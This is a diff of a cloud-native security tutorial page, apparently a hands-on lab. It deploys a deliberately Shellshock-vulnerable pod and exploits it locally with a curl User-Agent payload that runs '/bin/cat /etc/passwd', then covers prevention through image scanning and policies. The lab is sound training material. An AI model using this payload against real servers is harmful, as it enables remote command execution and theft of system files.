@@ -40,7 +40,7 @@
     
     
       
-        <title>Policies - Cloud Native Security Tutorial</title>
+        <title>Compromise a pod! - Cloud Native Security Tutorial</title>
       
     
     
@@ -89,7 +89,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#configuring-pods-to-run-securely" tabindex="1" class="md-skip">
+      <a href="#a-compromised-pod" tabindex="1" class="md-skip">
         Skip to content
       </a>
     
@@ -115,7 +115,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                Policies
+                Compromise a pod!
               
             </span>
           
@@ -248,11 +248,70 @@
       
       
 
+  
 
-  <li class="md-nav__item">
-    <a href="../compromise/" title="Compromise a pod!" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Compromise a pod!
+      </label>
+    
+    <a href="./" title="Compromise a pod!" class="md-nav__link md-nav__link--active">
       Compromise a pod!
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#run-a-server-vulnerable-to-shellshock" title="Run a server vulnerable to Shellshock" class="md-nav__link">
+    Run a server vulnerable to Shellshock
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit-the-vulnerability" title="Exploit the vulnerability" class="md-nav__link">
+    Exploit the vulnerability
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#preventing-this-attack" title="Preventing this attack" class="md-nav__link">
+    Preventing this attack
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#optional-questions-and-exercises" title="Optional questions and exercises" class="md-nav__link">
+    Optional questions and exercises
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
     
@@ -272,63 +331,11 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        Policies
-      </label>
-    
-    <a href="./" title="Policies" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../policies/" title="Policies" class="md-nav__link">
       Policies
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">Table of contents</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#least-privileges" title="Least privileges" class="md-nav__link">
-    Least privileges
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#network-policies" title="Network policies" class="md-nav__link">
-    Network policies
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#opa-in-action" title="OPA in action" class="md-nav__link">
-    OPA in action
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
     
@@ -377,22 +384,29 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#least-privileges" title="Least privileges" class="md-nav__link">
-    Least privileges
+  <a href="#run-a-server-vulnerable-to-shellshock" title="Run a server vulnerable to Shellshock" class="md-nav__link">
+    Run a server vulnerable to Shellshock
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#network-policies" title="Network policies" class="md-nav__link">
-    Network policies
+  <a href="#exploit-the-vulnerability" title="Exploit the vulnerability" class="md-nav__link">
+    Exploit the vulnerability
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#opa-in-action" title="OPA in action" class="md-nav__link">
-    OPA in action
+  <a href="#preventing-this-attack" title="Preventing this attack" class="md-nav__link">
+    Preventing this attack
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#optional-questions-and-exercises" title="Optional questions and exercises" class="md-nav__link">
+    Optional questions and exercises
   </a>
   
 </li>
@@ -413,19 +427,57 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/k8s-sec/cloud-native-security-tutorial/edit/master/docs/policies.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/k8s-sec/cloud-native-security-tutorial/edit/master/docs/compromise.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="configuring-pods-to-run-securely">Configuring pods to run securely<a class="headerlink" href="#configuring-pods-to-run-securely" title="Permanent link">&para;</a></h1>
-<h2 id="least-privileges">Least privileges<a class="headerlink" href="#least-privileges" title="Permanent link">&para;</a></h2>
-<p>http://canihaznonprivilegedcontainers.info/</p>
-<h2 id="network-policies">Network policies<a class="headerlink" href="#network-policies" title="Permanent link">&para;</a></h2>
-<p>https://banzaicloud.com/blog/network-policy/</p>
-<p>https://medium.com/@tufin/best-practices-for-kubernetes-network-policies-2b643c4b1aa</p>
-<h2 id="opa-in-action">OPA in action<a class="headerlink" href="#opa-in-action" title="Permanent link">&para;</a></h2>
-<p>what is it</p>
-<p>mini example via https://play.openpolicyagent.org/</p>
-<p>OPA Gatekeeper</p>
+                <h1 id="a-compromised-pod">A compromised pod<a class="headerlink" href="#a-compromised-pod" title="Permanent link">&para;</a></h1>
+<p>In this section we deliberately introduce a container image with a known vulnerability so that you can enjoy the experience of exploiting it!</p>
+<h2 id="run-a-server-vulnerable-to-shellshock">Run a server vulnerable to Shellshock<a class="headerlink" href="#run-a-server-vulnerable-to-shellshock" title="Permanent link">&para;</a></h2>
+<p>We're using a container with <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a>, a vulnerability in <code>bash</code> that allows an attacker to remotely execute commands. To make it really easy, we're providing a Helm chart that installs the vulnerable deployment. DO NOT RUN THIS IN A REAL CLUSTER!</p>
+<div class="highlight"><pre><span></span><code>helm install shellshockable https://lizrice.github.io/shellshockable/shellshockable-0.1.0.tgz
+</code></pre></div>
+
+<p>This will run a deployment with a single pod. It might take a few seconds to pull the image so check that it's up and running (your pod name will be different):</p>
+<div class="highlight"><pre><span></span><code>$ kubectl get pods
+NAME                             READY   STATUS    RESTARTS   AGE
+shellshockable-d5b7d44b4-9rpzd   1/1     Running   0          70s
+</code></pre></div>
+
+<p>In a separate terminal window, run port forwarding so we can make curl requests to this pod. This maps localhost port 8081 to the pod's port 80.</p>
+<div class="highlight"><pre><span></span><code>kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:80
+</code></pre></div>
+
+<p>You can now use curl (or a browser) to view the web service running on this pod. For example, if you open <a href="localhost:8081">localhost:8081</a> in your web browser, you'll see the Apache2 default welcome page. There is also a <a href="https://github.com/lizrice/shellshockable/blob/gh-pages/cgi-bin/shockme.cgi">script</a> that will return the words "Regular, expected output" at the address <a href="localhost:8081/cgi-bin/shockme.cgi">localhost:8081/cgi-bin/shockme.cgi</a>.</p>
+<p>If you look at the source for the <a href="https://github.com/lizrice/shellshockable/blob/gh-pages/cgi-bin/shockme.cgi">script</a> you'll see that it's executed using <code>bash</code>. This container is using a compromised version of <code>bash</code> with the Shellshock vulnerability, that an attacker can exploit to execute commands.</p>
+<p>First let's see the regular text is returned if we use <code>curl</code> to make the HTTPS request:</p>
+<div class="highlight"><pre><span></span><code>$ curl localhost:8081/cgi-bin/shockme.cgi
+Regular, expected output
+</code></pre></div>
+
+<p>You've seen the web server return content as expected. Now it's time to act like an attacker and exploit the Shellshock vulnerability.</p>
+<h2 id="exploit-the-vulnerability">Exploit the vulnerability<a class="headerlink" href="#exploit-the-vulnerability" title="Permanent link">&para;</a></h2>
+<p>You can exploit Shellshock by passing a User-Agent header on the <code>curl</code> request with the <code>-A</code> parameter. This gets expanded as an environment variable by <code>bash</code>, and because of the Shellshock vulnerability, it can be used to execute arbitrary commands. For example</p>
+<div class="highlight"><pre><span></span><code>curl -A &quot;() { :; }; echo \&quot;Content-type: text/plain\&quot;; echo; /bin/cat /etc/passwd&quot; localhost:8081/cgi-bin/shockme.cgi
+</code></pre></div>
+
+<p>Instead of running the CGI script as normal, this reponds to the HTTP request with the contents of <code>/etc/passwd</code>!</p>
+<h2 id="preventing-this-attack">Preventing this attack<a class="headerlink" href="#preventing-this-attack" title="Permanent link">&para;</a></h2>
+<p>The safest way to prevent this attack is to ensure the vulnerable version of <code>bash</code> isn't included in the container image before it's deployed. This is done with <a href="../scanning/"><strong>container image scanning</strong></a>.</p>
+<p>Image scanning can only detect known, published vulnerabilities. You can also limit the likely damage of as-yet-unknown compromises by configuring containers to run more securely and using <a href="../policies/"><strong>policies</strong></a> to enforce safer configuration.</p>
+<h2 id="optional-questions-and-exercises">Optional questions and exercises<a class="headerlink" href="#optional-questions-and-exercises" title="Permanent link">&para;</a></h2>
+<p>If you have the time and interest, here are some additional things you might like to think about.</p>
+<ol>
+<li>Try running some other commands as if you were an attacker! For example, you could<ul>
+<li>find out what environment variables are set</li>
+<li>see what user ID you're running as</li>
+<li>explore the contents of the filesystem to see what is available</li>
+</ul>
+</li>
+<li>Where does this <code>/etc/passwd</code> file come from - the host or the container?</li>
+<li>What would happen if you mounted files from the host into this container?</li>
+<li>Take a look at the <a href="https://github.com/lizrice/shellshockable/blob/master/Dockerfile">Dockerfile</a> that builds the container image used in this example. It deliberately installed an old, vulnerable version of <code>bash</code>.</li>
+<li>Try running a deployment with an up-to-date version of <code>apache2</code> without the vulnerability, and check that you can't exploit it in the same way.</li>
+</ol>
                 
                   
                 
@@ -446,7 +498,7 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../scanning/" title="Scanning" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../introduction/" title="Introduction" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -455,19 +507,19 @@
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                Scanning
+                Introduction
               </span>
             </div>
           </a>
         
         
-          <a href="../settings/" title="Secure settings" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../scanning/" title="Scanning" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                Secure settings
+                Scanning
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
